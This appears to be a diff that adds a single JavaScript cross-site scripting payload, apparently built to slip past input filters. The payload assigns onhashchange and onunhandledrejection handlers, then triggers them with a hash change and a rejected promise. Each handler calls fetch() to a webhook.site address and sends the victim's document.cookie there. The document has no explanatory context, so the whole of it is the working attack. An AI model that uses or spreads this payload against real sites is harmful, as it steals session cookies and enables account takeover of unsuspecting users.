@@ -1,0 +1,2 @@
+
+void [onhashchange="fetch('https://webhook.site/<webhook-token>/h-'+encodeURIComponent(document.cookie))"][location="#x"],void [onunhandledrejection="fetch('https://webhook.site/<webhook-token>/r-'+encodeURIComponent(document.cookie))"],Promise.reject
